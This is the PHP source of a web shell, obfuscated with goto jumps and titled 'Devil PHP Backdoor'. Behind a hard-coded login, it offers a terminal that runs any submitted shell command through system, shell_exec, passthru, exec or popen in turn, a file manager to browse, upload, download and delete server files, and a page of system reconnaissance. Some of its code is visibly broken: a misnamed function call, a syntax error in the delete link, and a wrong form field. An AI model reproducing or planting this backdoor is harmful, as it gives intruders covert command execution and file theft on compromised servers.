<?php
goto NF05T;
YPfBX:
if (isset($_POST["login"]) && isset($_POST["pass"])) {
    if ($_POST["login"] == "Nom anProdh an" && $_POST["pass"] == "NomanProdh@KS") {
        $_SESSION["login"] = "logged";
    }
}
goto Zp5zn;
NF05T:
ob_start();
goto JEcBt;
mQdYc:
if (isset($_GET["delete"]) && !empty($_GET["delete"]) && isset($_GET["chDir"])) {
    if (unlink($_GET["chDir"] . "/" . $_GET["delete"])) {
        $deleteFileFlag = "File has been deleted.";
    } else {
        $deleteFileFlag = "Couldn't delete the file.";
    }
}
goto Jtz3n;
DEn3Z:
function downloadFile($file)
{
    if (file_exists($file)) {
        try {
            header("Content-Description: File Transfer");
            header("Content-Type: application/octet-stream");
            header("Content-Disposition: attachment; filename=" . basename($file));
            header("Expires: 0");
            header("Cache-Control: must-revalidate");
            header("Pragma: public");
            header("Content-Length: " . filesize($file));
            readfile($file);
            die;
        } catch (Exception $e) {
        }
    }
}
goto Wd1_Z;
wO6it:
function uploadFile($path, $file)
{
    $targetFile = $path . "/" . basename($file["uploadFile"]["name"]);
    if (!is_writable($path)) {
        return "Don't have write permission.";
    } else {
        if (move_uploaded_file($file["uploadFile"]["tmp_name"], $targetFile)) {
            return "File has been uploaded.";
        } else {
            return "Couldn't upload file.";
        }
    }
}
goto Yws85;
qWjEv:
function createFile($path, $name)
{
    if (file_exists($path . "/" . $name)) {
        echo "File already exists.";
    } else {
        if (!is_writable($path)) {
            echo "Don't have write permission.";
        } else {
            try {
                $file = fopen($path . "/" . $name, "w");
                fwrite($file, "test");
                fclose($file);
                return "File has been created.";
            } catch (Exception $e) {
                return "error.";
            }
        }
    }
}
goto gH58q;
jU1sD:
if (!isset($_SESSION["login"])) {
?>
<div class="center">
    <h1>Login to Devil PHP Backdoor</h1><br>
    <form action="<?php echo $_SERVER["PHP_SELF"]; ?>" method="POST"><input name="login" placeholder="Login"> <input name="pass" placeholder="Password" type="password">
        <button type="submit">Login</button></form><br>
    <hr>
    <br><?php echo "<h2>Server IP : " . $_SERVER["SERVER_ADDR"] . "</h2>"; ?>
    <br>
    <hr>
</div><?php } else { ?>
<h1 style="margin-top:20px">Devil PHP Backdoor</h1>
<table style="margin-top:20px">
    <tr>
        <td><a class="simple-nav-item" href="?action=system">System Info</a></td>
        <td><a class="simple-nav-item" href="?action=files">File Manager</a></td>
        <td><a class="simple-nav-item" href="?action=terminal">Terminal</a></td>
        <td><a class="simple-nav-item" href="?action=logout">Logout</a></td>
    </tr>
</table><br>
<h2>SERVER IP: <?php echo $_SERVER["SERVER_ADDR"]; ?></h2>
<?php echo posix_getpwuid(posix_geteuid())["name"]; echo "@"; echo gethostname(); echo "<br>" . getcwd(); ?>
<br><br>
<hr>

<br><?php  if (isset($_GET["action"])) { if ($_GET["action"] == "files") { if (isset($_GET["chDir"]) && !empty($_GET["chDir"])) { if (is_dir($_GET["chDir"])) { if (is_readable($_GET["chDir"])) { chdir(strval($_GET["chDir"])); } else { echo "Don't have read permission."; } } else { echo "It's not a directory."; } } ?>
<form action=""><input name="chDir" placeholder="Change working directory [Current :<?php  echo getcwd(); ?>
]" style="width:900px"> <input name="action" type="hidden" value="files"> <button type="submit">Change</button></form>
<?php  if (isset($deleteFileFlag)) { echo $deleteFileFlag; } ?>
<table class="table-1" style="width:1024px;height:500px;margin-bottom:25px">
    <tr>
        <td style="width:1000px;height:500px">
            <div class="fileManContent">
                <table style="width:100%">
                    <thead style="background:#0bdbca;color:#000">
                        <td>#</td>
                        <td>Name</td>
                        <td>Size</td>
                        <td>Perm</td>
                    </thead>
                    <tbody>
                        <?php  $dirList = scandir(getcwd()); $counter = 1; foreach ($dirList as $dirContent) { echo "<tr style='background:#424543;color:#fff'>"; echo "<td>"; echo $counter; $counter++; echo "</td>"; echo "<td>"; if (is_dir($dirContent)) { echo "<a class='link-1' href='?action=files&chDir=" . getcwd() . "/" . $dirContent . "'>" . $dirContent . "</a></br>"; } else { echo $dirContent; echo showDownloadLink($dirContent); echo showDeleteLink($dirContent); } echo "</td>"; echo "<td>"; try { if (!is_dir($dirContent)) { $size = filesize($dirContent); if ($size > 1000) { $size /= 1000; if ($size > 1000) { $size /= 1000; echo round($size) . " mb"; } else { echo round($size) . " kb"; } } else { echo $size . " bytes"; } } else { echo "-"; } } catch (Exception $e) { } echo "</td>"; echo "<td>"; try { echo filePerms($dirContent); } catch (Exception $e) { } echo "</td>"; echo "</tr>"; } ?>
                    </tbody>
                </table>
            </div>
        </td>
        <td></td>
    </tr>
</table>
<table class="table-1">
    <td><?php  if (isset($createFolderFlag)) { echo $createFolderFlag; } ?>
        <form action="" method="POST"><input name="folderName" placeholder="Folder Name" style="width:320px"> <button
                type="submit">Create Folder</button></form>
    </td>
    <td><?php  if (isset($createFileFlag)) { echo $createFileFlag; } ?>
        <form action="" method="POST"><input name="fileName" placeholder="File Name" style="width:320px"> <button type="submit">Create File</button></form>
    </td>
    <tr>
        <td><?php  if (isset($uploadFileFlag)) { echo $uploadFileFlag; } ?>
            <form action="" method="POST" enctype="multipart/form-data"><input name="uploadFile" placeholder="Select file" style="width:320px" type="file"> <button type="submit">Upload</button>
            </form>
        </td>
    </tr>
</table>
<br><?php
} elseif ($_GET["action"] == "logout") {
    unset($_SESSION["login"]);
    session_destroy();
    header("Refresh:0");
} elseif ($_GET["action"] == "terminal") {
?>
<form action="" method="POST"><input name="command" placeholder="Command" style="width:900px"> <button
        type="submit">Execute</button></form>
<table class="table-1" style="width:1024;height:500px">
    <tr>
        <td>
            <pre><?php
            if (isset($_POST["command"]) && !empty($_POST["command"])) {
                if (!checkFunctions("system")) {
                    system(strval($_POST["command"]), $SystemResult);
                } elseif (!checkFunctions("shell_exec")) {
                    echo shell_exec(strval($_POST["command"]));
                } elseif (!checkFunctions("passthru")) {
                    echo passthru(strval($_POST["command"]));
                } elseif (!checkFunctions("exec")) {
                    exec(strval($_POST["command"]), $ExecResult, $retval);
                    foreach ($ExecResult as $output) {
                        echo $output . "<br>";
                    }
                } elseif (!checkFunctions("popen")) {
                    $handle = popen(strval($_POST["command"]) . " 2>&1", "r");
                    $read = fread($handle, 2096);
                    echo $read;
                    fclose($handle);
                } else {
                    echo "<h1>Sorry, can't execute command !</h1>";
                }
            }
            ?>
            </pre>
        </td>
    </tr>
</table>
<?php
} else {
?>
<table class="table-1">
    <tr>
        <td>Operating System</td>
        <td><?php echo php_uname("s"); ?>
        </td>
    </tr>
    <tr>
        <td>Release Name</td>
        <td><?php echo php_uname("r"); ?>
        </td>
    </tr>
    <tr>
        <td>Version Information</td>
        <td><?php echo php_uname("v"); ?>
        </td>
    </tr>
    <tr>
        <td>Host Name</td>
        <td><?php echo php_uname("n"); ?>
        </td>
    </tr>
    <tr>
        <td>Machine Type</td>
        <td><?php echo php_uname("m"); ?>
        </td>
    </tr>
    <tr>
        <td>PHP Version</td>
        <td><?php echo phpversion(); ?>
        </td>
    </tr>
    <tr>
        <td>PHP Interface</td>
        <td><?php echo php_sapi_name(); ?>
        </td>
    </tr>
    <tr>
        <td>Server IP</td>
        <td><?php echo $_SERVER["SERVER_ADDR"]; ?>
        </td>
    </tr>
    <tr>
        <td>User</td>
        <td><?php echo posix_getpwuid(posix_geteuid())["name"]; ?>
        </td>
    </tr>
    <tr>
        <td>Disabled PHP Functions</td>
        <td><?php echo ini_get("disable_functions"); ?>
        </td>
    </tr>
</table>
<?php
}
} else {
?>
<h1>Welcome to Devil PHP Backdoor</h1>
<?php
}
}
goto UgpIw;
Zp5zn:
function checkFunctions($param)
{
    $disabled_functions = explode(",", ini_get("disable_functions"));
    return in_array($param, $disabled_functions);
}
goto qWjEv;
xN9_z:
?>

<!doctypehtml>
    <html>

    <head>
        <title>Devil PHP Backdoor</title>
        <style>
        ::-webkit-scrollbar {
            width: 10px
        }

        ::-webkit-scrollbar-track {
            box-shadow: inset 0 0 5px grey;
            border-radius: 5px
        }

        ::-webkit-scrollbar-thumb {
            background: #24484a;
            border-radius: 5px
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #0bdbca
        }

        * {
            margin: 0;
            padding: 0
        }

        body {
            background: #000;
            color: #0bdbca;
            max-width: 1024px;
            margin: auto;
            font-family: 'Courier New', Courier, monospace
        }

        .center {
            margin: 0;
            position: absolute;
            top: 50%;
            left: 50%;
            -ms-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%)
        }

        input {
            width: auto;
            border: #0bdbca 2px solid;
            background: #000;
            color: #0bdbca;
            height: 30px;
            width: 200px;
            padding: 10px;
            font-size: 18px;
            font-family: 'Courier New', Courier, monospace;
            outline: 0
        }

        input:focus {
            border: #0bdbca 2px solid;
            background: #000;
            color: #0bdbca
        }

        button {
            background: #0bdbca;
            color: #000;
            outline: 0;
            padding: 10px;
            font-family: 'Courier New', Courier, monospace;
            border: #0bdbca 2px solid;
            height: 55px
        }

        .simple-nav {
            background: #000;
            border: #0bdbca 2px solid;
            height: 40px;
            width: 100%
        }

        .simple-nav-item {
            text-decoration: none;
            height: 40px;
            border: #000 1px solid;
            background: #0bdbca;
            color: #000;
            padding: 10px
        }

        .table-1 {
            margin-top: 20px;
            border: #0bdbca 2px solid;
            width: 100%;
            max-width: 1920px
        }

        td {
            padding: 5px
        }

        pre {
            height: 500px;
            width: 1000px;
            text-align: left;
            overflow: scroll;
            font-size: 13px
        }

        .main-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            height: auto;
            padding: 20px
        }

        .link-1 {
            text-decoration: none;
            color: #0bdbca
        }

        .link-2 {
            text-decoration: none;
            color: #fff
        }

        .fileManContent {
            width: 994px;
            height: 500px;
            overflow: scroll;
            margin: 0;
            padding: 0
        }

        .fileManContent thead th {
            position: sticky;
            top: 0
        }

        a {
            text-decoration: none;
            color: #09947d
        }
        </style>
    </head>

    <body>
        <div>

        <?php
            goto jU1sD;
            JEcBt:
            session_start();
            goto YPfBX;
            gH58q:
            function createFolder($path, $name)
            {
                if (is_dir($path . "/" . $name)) {
                    return "Folder already exists.";
                } else {
                    if (!is_writable($path)) {
                        return "Don't have write permission.";
                    } else {
                        try {
                            mkdir($path . "/" . $name, 511);
                            return "Folder has been created.";
                        } catch (Exception $e) {
                            return "Error.";
                        }
                    }
                }
            }
            goto wO6it;
            nslsP:
            function filePrmissions($file)
            {
                $perms = fileperms($file);
                switch ($perms & 61440) {
                    case 49152:
                        $info = "s";
                        break;
                    case 40960:
                        $info = "l";
                        break;
                    case 32768:
                        $info = "-";
                        break;
                    case 24576:
                        $info = "b";
                        break;
                    case 16384:
                        $info = "d";
                        break;
                    case 8192:
                        $info = "c";
                        break;
                    case 4096:
                        $info = "p";
                        break;
                    default:
                        $info = "u";
                }
                $info .= $perms & 256 ? "r" : "-";
                $info .= $perms & 128 ? "w" : "-";
                $info .= $perms & 64 ? $perms & 2048 ? "s" : "x" : ($perms & 2048 ? "S" : "-");
                $info .= $perms & 32 ? "r" : "-";
                $info .= $perms & 16 ? "w" : "-";
                $info .= $perms & 8 ? $perms & 1024 ? "s" : "x" : ($perms & 1024 ? "S" : "-");
                $info .= $perms & 4 ? "r" : "-";
                $info .= $perms & 2 ? "w" : "-";
                $info .= $perms & 1 ? $perms & 512 ? "t" : "x" : ($perms & 512 ? "T" : "-");
                return $info;
            }
            goto mDIY_;
            U8v5_:
            if (isset($_FILES["uploadFile"]) && !empty($_FILES["uploadFile"]["name"])) {
                $dir = getcwd();
                if (isset($_GET["chDir"]) && !empty($_GET["chDir"])) {
                    $dir = $_GET["chDir"];
                }
                $uploadFileFlag = uploadFile($dir, $_FILES);
            }
            goto xN9_z;
            Wd1_Z:
            function showDownloadLink($file)
            {
                $dir = getcwd();
                if (isset($_GET["chDir"])) {
                    $dir = $_GET["chDir"];
                }
                echo "<a href=\"?action=files&chDir=" . $dir . "&download=" . $file . "\"/>[Download]</a>";
            }
            goto IZkan;
            Jtz3n:
            if (isset($_POST["folderName"]) && !empty($_POST["folderName"])) {
                $dir = getcwd();
                if (isset($_GET["chDir"]) && !empty($_GET["chDir"])) {
                    $dir = $_GET["chDir"];
                }
                $createFileFlag = createFile($dir, $_POST["folderName"]);
            }
            goto CDhow;
            IZkan:
            function showDeleteLink($file)
            {
                $dir = getcwd();
                if (isset($_GET["chDir"])) {
                    $dir = $_GET["chDir"];
                }
                echo "<a href=\"?action=files&chDir=" . $dir . "&delete=" . $file .\"/>[Delete]</a>";
            }
            goto nslsP;
            CDhow:
            if (isset($_POST["folderName"]) && !empty($_POST["folderName"])) {
                $dir = getcwd();
                if (isset($_GET["chDir"]) && !empty($_GET["chDir"])) {
                    $dir = $_GET["chDir"];
                }
                $createFolderFlag = createFolder($dir, $_POST["folderName"]);
            }
            goto U8v5_;
            mDIY_:
            if (isset($_GET["download"]) && !empty($_GET["download"]) && isset($_GET["chDir"])) {
                downloadFile($_GET["chDir"] . "/" . $_GET["download"]);
            }
            goto mQdYc;
            Yws85:
            function getFileMime($file)
            {
                return mime_content_type($file);
            }
            goto DEn3Z;
            UgpIw:
            ?>


        </div>
    </body>

    </html>